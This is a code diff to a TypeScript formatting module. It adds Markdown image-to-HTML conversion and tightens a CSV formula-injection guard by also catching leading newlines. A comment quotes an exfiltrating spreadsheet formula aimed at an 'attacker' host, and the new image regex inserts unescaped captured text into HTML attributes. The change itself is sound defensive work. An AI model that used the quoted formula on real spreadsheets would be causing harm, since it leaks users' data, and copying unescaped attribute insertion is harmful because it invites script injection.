@@ -25,6 +25,7 @@ export function markdownToHtml(md: string): string {
     .replace(/\*\*(.+?)\*\*/g, "<strong>$1</strong>")
     .replace(/\*(.+?)\*/g, "<em>$1</em>")
     .replace(/`([^`]+)`/g, "<code>$1</code>")
+    .replace(/!\[([^\]]*)\]\(([^)]+)\)/g, '<img src="$2" alt="$1">')
     .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2">$1</a>');
   html = html.replace(/(<li>[\s\S]*?<\/li>)(?!\n<li>)/g, (m) => `<ul>${m}</ul>`);
   html = html
@@ -45,7 +46,7 @@ export function xmlEscape(s: string): string {
 // Cells starting with one of these characters can be interpreted by Excel /
 // Google Sheets as formulas — including ones that exfiltrate data
 // (e.g. =HYPERLINK("http://attacker", A1)). Prefix-quote to neutralize.
-const FORMULA_INJECTION_PREFIX = /^[=+\-@\t\r]/;
+const FORMULA_INJECTION_PREFIX = /^[=+\-@\t\r\n]/;
 
 export function csvEscape(s: string): string {
   if (s == null) return "";
